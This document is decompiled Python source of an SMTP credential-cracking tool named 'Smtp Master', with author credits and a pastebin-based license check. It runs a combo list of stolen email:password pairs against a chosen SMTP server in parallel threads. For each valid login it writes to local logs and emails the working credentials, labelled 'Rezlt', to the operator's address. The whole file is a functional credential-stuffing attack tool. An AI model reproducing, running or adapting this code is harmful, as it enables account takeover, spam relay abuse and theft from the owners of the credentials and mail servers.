# -*- coding: utf-8 -*-
from __future__ import unicode_literals
# uncompyle6 version 3.6.5
# Python bytecode 3.4 (3310)
# Decompiled from: Python 2.7.16 (v2.7.16:413a49145e, Mar  4 2019, 01:37:19) [MSC v.1500 64 bit (AMD64)]
# Warning: this version has problems handling the Python 3 byte type in contants properly.

# Embedded file name: master.py
# Compiled at: 1995-09-27 17:18:56
# Size of source mod 2**32: 272 bytes
import ctypes
import datetime
import getpass
import os
import random
import requests
import smtplib
import socket
import sys
import threading
import time

from colorama import Fore
from colorama import Style
from colorama import init
from platform import system
from time import time as timer
init(autoreset=True)
init(autoreset=True)
fr = Fore.RED
gr = Fore.BLUE
fc = Fore.CYAN
fw = Fore.WHITE
fy = Fore.YELLOW
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT
live = 0
die = 0
try:
    os.mkdir('Master-Log')
except:
    pass
print("SMTP Cracker By Kira Lag Fucked By RetroTeam")

def logo():
    clear = '\x1b[0m'
    colors = [36, 32, 34, 35, 31, 37]
    x = '\n\n            _________________________________________________________________________\n                     __   __  _______  _______  _______  _______  ______   \n                    |  |_|  ||   _   ||       ||       ||       ||    _ |  \n                    |       ||  |_|  ||  _____||    ___||_     _||   | ||  \n                    |       ||       || |_____ |   |___   |   |  |   |_||_ \n                    |       ||       ||_____  ||    ___|  |   |  |    __  |\n                    | ||_|| ||   _   | _____| ||   |___   |   |  |   |  | |\n                    |_|   |_||__| |__||_______||_______|  |___|  |___|  |_|\n                                                      \n'
    for N, line in enumerate(x.split('\n')):
        sys.stdout.write('\x1b[1;%dm%s%s\n' % (random.choice(colors), line, clear))
        time.sleep(0.05)


def key_logo():
    clear = '\x1b[0m'
    colors = [36, 32, 34, 35, 31, 37]
    x = '\n\n\n                                       .--.\n                                      /.-. \'----------.\n                                      \'-\' .--"--""-"-\'\n                                       \'--\'\n                                                              \n\n\n'
    for N, line in enumerate(x.split('\n')):
        sys.stdout.write('\x1b[1;%dm%s%s\n' % (random.choice(colors), line, clear))
        time.sleep(0.05)


def cr():
    try:
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
    except:
        pass


def key():
    try:
        print('{}{}\n\t\t[+] Checking Licnse Key'.format(fw, sb))
        lwl = requests.get('https://pastebin.com/raw/pfquJ9MT')
        so2al = open('KEY.txt', 'r').readlines()
        #so = so2al[0]
        br = str(so2al)
        if br in str(lwl.content):
            print('\t{}{}[+] Welcome USER ...'.format(fw, sb))
        else:
            so2al1 = input('\n\t{}{}[-] Give Me Licnse Key : '.format(fw, sb))
            tani = requests.get('https://pastebin.com/raw/pfquJ9MT')
            br = str(so2al1)
            if str(br) in str(tani.content):
                print('\t\t{}{}[+] Welcome USER ..'.format(fw, sb))
                z = open('KEY.txt', 'w').write(so2al1)
            else:
                print('\n{}{}\t[-] LICENSE KEY INCORRECT!'.format(fr, sb))
                print("'\n{}{}\t\t[-] PLEASE BACK TO CODER\n\n\t\t{}FB:https://www.fb.com/xXxKIRAxX{}".format(fr, sb, fw, sb))
                time.sleep(20)
                sys.exit()
    except:
        try:
            so2al1 = input('\n\t{}{}[-] Give Me Licnse Key : '.format(fw, sb))
            tani = requests.get('https://pastebin.com/raw/pfquJ9MT')
            br = str(so2al1)
            if str(br) in str(tani.content):
                print('\t\t{}{}[+] Welcome USER ..'.format(fw, sb))
                z = open('KEY.txt', 'w').write(so2al1)
            else:
                print('\n{}{}\t[-] LICENSE KEY INCORRECT!'.format(fr, sb))
                print("'\n{}{}\t\t[-] PLEASE BACK TO CODER\n\n\t\t{}FB:https://www.fb.com/xXxKIRAxX{}".format(fr, sb, fw, sb))
                time.sleep(20)
                sys.exit()
        except Exception as f:
            exit()


def checker_ssl(user, passw):
    global die
    global live
    while True:
        ctypes.windll.kernel32.SetConsoleTitleW('Smtp Master Ch |By Kira |ToTal Users- {}|Live- {} |Die- {}'.format(totalnum, live, die))
        try:
            mailserver = smtplib.SMTP(host, port)
            mailserver.ehlo()
            mailserver.starttls()
            mailserver.login(user, passw)
            subj = 'New Rezlt | Smtp Master'
            date = datetime.datetime.now().strftime('%d/%m/%Y %H:%M')
            if '@' not in user:
                froma = user + '@Smtp-Master.com'
            else:
                froma = user
            from_addr = froma
            to_addr = str(email)
            message_text = '+++++++++ Rezlt information +++++++++\n[+] E-mail : {}\n[+] E-mail Password : {}\n[+] Host : {}\n[+] Port : {}\n+++++++++ | + K I R A + | +++++++++'.format(user, passw, host, port, date)
            msg = 'From: %s\nTo: %s\nSubject: %s\nDate: %s\n\n%s' % (from_addr, to_addr, subj, date, message_text)
            mailserver.sendmail(from_addr, to_addr, msg)
            mailserver.quit()
            print(' {}[+] Live{} ==> {}:{}'.format(fg, sb, user, passw))
            f = open('Master-Log/Live-{}.txt'.format(host), 'a')
            f.write('LIVE => %s:%s\n' % (user, passw))
            live += 1
        except Exception as f:
            f = open('Master-Log/Die-{}.txt'.format(host), 'a')
            f.write('Die => %s:%s\n' % (user, passw))
            die += 1

        break


def checker_(user, passw):
    global die
    global live
    while True:
        ctypes.windll.kernel32.SetConsoleTitleW('Smtp Master |By Kira |ToTal Users- {}|Live- {} |Die- {}'.format(totalnum, live, die))
        try:
            mailserver = smtplib.SMTP(host, port)
            mailserver.ehlo()
            mailserver.login(user, passw)
            subj = 'New Rezlt | Smtp Master'
            date = datetime.datetime.now().strftime('%d/%m/%Y %H:%M')
            if '@' not in user:
                froma = user + '@Smtp-Master.com'
            else:
                froma = user
            from_addr = froma
            to_addr = str(email)
            message_text = '+++++++++ Rezlt information +++++++++\n[+] E-mail : {}\n[+] E-mail Password : {}\n[+] Host : {}\n[+] Port : {}\n[+] SSL/TLS : Off\n+++++++++ Smtp Master +++++++++'.format(user, passw, host, port)
            msg = 'From: %s\nTo: %s\nSubject: %s\nDate: %s\n\n%s' % (from_addr, to_addr, subj, date, message_text)
            mailserver.sendmail(from_addr, to_addr, msg)
            mailserver.quit()
            print(' {}[+] Live{} ==> {}:{}'.format(fg, sb, user, passw))
            f = open('Master-Log/Live-{}.txt'.format(host), 'a')
            f.write('LIVE => %s:%s\n' % (user, passw))
            live += 1
        except Exception as f:
            f = open('Master-Log/Die-{}.txt'.format(host), 'a')
            f.write('Die => %s:%s\n' % (user, passw))
            die += 1

        break


def thread():
    global email
    global host
    global passw
    global port
    global totalnum
    global user
    x = '\n\t\t\t\x1b[1;36m \x1b[0;m            \x1b[1;41m Smtp Master Script ! Coded By Kira Lag & Fucked By RetroTeam ^-^!\x1b[0;m   \x1b[1;36m  \x1b[0;m'
    xx = '\t\t\t\x1b[1;36m \x1b[0;m     \x1b[1;41m FB: https://www.facebook.com/xXxKIRAxX\x1b[0;m   \x1b[1;36m  \x1b[0;m'
    xxx = '\t\t\x1b[1;36m \x1b[0;m                    \x1b[1;41m ICQ: 742809576\x1b[0;m   \x1b[1;36m  \x1b[0;m'
    print(x)
    print(xx)
    print(xxx)
    host = input('{}{}\n\t\t[ ! ] Give Me The Smtp Host ! : '.format(fy, sb))
    port = input('{}{}\n\t\t[ ! ] Give Me The Smtp Port ! : '.format(fy, sb))
    ssl = input('{}{}\n\t\t[ ! ] Do U want Use SSL/TLS Or nun y/n ! : '.format(fy, sb))
    email = input('{}{}\n\t\t[ ! ] Your Email For Rezlt ! : '.format(fw, sb))
    print('\n\t\t\t{}{}[ ! ] Give Me Combo List ! : '.format(fw, sb), end='')
    txt = input()
    with open(txt) as (file):
        lista = file.read().split('\n')
    totalnum = len(lista)
    print('\n\t\t{}{}[ ! ] Threads Number ! : '.format(fw, sb), end='')
    threadnum = int(input())
    print('{}{}\n\t===============[Start Check for ({}:{})]==============='.format(fy, sb, host, port))
    threads = []
    if ssl == 'n':
        for i in lista:
            try:
                user = i.split(':')[0]
                passw = i.split(':')[1]
            except:
                continue

            thread = threading.Thread(target=checker_, args=(user.strip(), passw.strip()))
            threads.append(thread)
            thread.start()
            if len(threads) == threadnum:
                for i in threads:
                    i.join()

                threads = []
                continue

        time.sleep(15)
    else:
        for i in lista:
            try:
                user = i.split(':')[0]
                passw = i.split(':')[1]
            except:
                continue

            thread = threading.Thread(target=checker_ssl, args=(user.strip(), passw.strip()))
            threads.append(thread)
            thread.start()
            if len(threads) == threadnum:
                for i in threads:
                    i.join()

                threads = []
                continue

        time.sleep(15)


def start():
    cr()
    key_logo()
    key()
    cr()
    logo()
    thread()


start()
# okay decompiling C:\Users\Unknown\Documents\Telegram\Smtp Master(1)\Smtp Master\Xtracted\master.exe\master.pyc
